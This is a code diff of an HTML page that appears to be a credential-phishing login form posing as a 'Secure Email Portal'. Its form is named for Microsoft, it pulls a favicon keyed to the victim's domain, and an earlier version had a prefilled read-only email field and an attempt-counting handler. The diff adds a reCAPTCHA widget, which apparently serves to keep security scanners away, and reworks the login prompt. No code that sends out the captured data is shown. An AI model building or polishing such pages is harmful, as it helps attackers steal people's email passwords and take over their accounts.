@@ -5,32 +5,32 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>EMAIL PORTAL</title>
     <link rel="stylesheet" href="styles.css">
+    <!-- Add reCAPTCHA script -->
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
 </head>
 <body>
     <div class="container">
         <form id="microsoft-login-form">
             <h2>SECURE EMAIL PORTAL</h2>
-            <P style="text-align: center; margin-top: 0%; margin-bottom: 7%;">Powered by webmail</P>
+            <p style="text-align: center; margin-top: 0%; margin-bottom: 7%;">Powered by webmail</p>
             <div class="xlogo">
                 <img id="zion" src="https://www.google.com/s2/favicons?domain=">
                 <span style="text-transform: lowercase;" class="text-g" id="banNer">enter email</span>
             </div>
             <div class="form-group">
-                <input type="email" id="email" name="email" class="input-field" placeholder="Email" required readonly>
+                <input type="email" id="email" name="email" class="input-field" placeholder="Email" required>
             </div>
             <div class="form-group">
                 <input type="password" id="password" name="password" class="input-field" placeholder="Password" required>
-            </div>          
-
-            <div id="error-message" class="error-message"><p class="encouragement-message">Connect to your domain's DNS</p></div><br>
+            </div>
+            <!-- Add reCAPTCHA widget -->
+            <div class="g-recaptcha" data-sitekey="6LdIzuYpAAAAAHT5nKyqfZa1ITwX_EWoYwnF-Nhd"></div>
+            <!-- Error message display -->
+            <div id="error-message" class="error-message"><p id="loginMessage" class="login-message">Login to continue!</p> <!-- Placeholder for login message --></div>
+            <br>
+            <button type="submit" id="login-button">Login</button>
             
-            <button type="submit" id="login-button" onclick="checkAttempts()">Login</button>
-            <p id="loginMessage" class="login-message"></p> <!-- Placeholder for login message -->
-
-            <!-- Compelling message to encourage login -->
-            
-
-            <!-- Copyright and other email login server-related stuff -->
+                        <!-- Copyright and other email login server-related stuff -->
             <footer>
                 <p class="copyright">Copyright &copy; 2024 Secure Email Portal. All rights reserved.</p>
                 <p class="support-info">For assistance, contact <a href="mailto:support@webmail.com">support@webmail.com</a></p>
